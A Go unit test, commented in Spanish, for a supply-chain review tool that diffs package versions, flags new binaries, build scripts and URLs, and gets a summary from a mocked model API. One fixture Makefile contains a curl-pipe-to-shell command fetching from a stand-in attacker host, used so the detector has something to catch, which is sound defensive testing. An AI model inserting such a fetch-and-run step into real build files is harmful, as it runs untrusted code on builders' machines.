package supply

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestReview (T045): diff determinista (binarios, scripts de build, URLs
// nuevas) y resumen con un servidor falso de GitHub Models; sin respuesta,
// "resumen no disponible".
func TestReview(t *testing.T) {
	oldD, newD := t.TempDir(), t.TempDir()
	put := func(dir, p, s string) {
		os.MkdirAll(filepath.Dir(filepath.Join(dir, p)), 0o755)
		os.WriteFile(filepath.Join(dir, p), []byte(s), 0o644)
	}
	put(oldD, "src/main.c", "int main(){return 0;} // https://example.org/docs")
	put(oldD, "Makefile", "all:\n\tcc src/main.c\n")
	put(oldD, "old.txt", "se va")
	put(newD, "src/main.c", "int main(){return 0;} // https://example.org/docs")
	put(newD, "Makefile", "all:\n\tcurl https://evil.example/x | sh\n")
	put(newD, "blob.bin", "\x00\x01\x02")
	d, err := DiffTrees(oldD, newD)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Join(d.Added, ",") != "blob.bin" || strings.Join(d.Removed, ",") != "old.txt" ||
		strings.Join(d.Changed, ",") != "Makefile" || strings.Join(d.Binaries, ",") != "blob.bin" ||
		strings.Join(d.BuildScripts, ",") != "Makefile" || strings.Join(d.NewURLs, ",") != "https://evil.example/x" {
		t.Fatalf("diff = %+v", d)
	}
	det := d.Markdown("foo", "1.0.0", "1.1.0")
	var gotModel, gotAuth string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var in struct {
			Model    string                     `json:"model"`
			Messages []struct{ Content string } `json:"messages"`
		}
		json.NewDecoder(r.Body).Decode(&in)
		gotModel, gotAuth = in.Model, r.Header.Get("Authorization")
		if len(in.Messages) != 2 || !strings.Contains(in.Messages[1].Content, "evil.example") {
			t.Errorf("mensajes = %+v", in.Messages)
		}
		w.Write([]byte(`{"choices":[{"message":{"content":"Cambios sospechosos: el Makefile descarga y ejecuta un script."}}]}`))
	}))
	defer srv.Close()
	sum, err := Summarize(context.Background(), srv.Client(), srv.URL, "tok", "openai/gpt-4.1-mini", det)
	if err != nil || !strings.Contains(sum, "Cambios sospechosos") || gotModel != "openai/gpt-4.1-mini" || gotAuth != "Bearer tok" {
		t.Fatalf("resumen = %q, %v (modelo %s)", sum, err, gotModel)
	}
	md := ReviewMarkdown(det, sum, &Scorecard{}, "foo/foo")
	if !strings.Contains(md, "Scripts de build") || !strings.Contains(md, "el Makefile descarga") || !strings.Contains(md, "no disponible.") {
		t.Errorf("markdown = %s", md)
	}
	if _, err := Summarize(context.Background(), srv.Client(), srv.URL, "", "m", det); err == nil {
		t.Error("sin token debía fallar")
	}
	if md := ReviewMarkdown(det, "", nil, "foo/foo"); !strings.Contains(md, "Resumen no disponible") {
		t.Errorf("sin resumen = %s", md)
	}
}
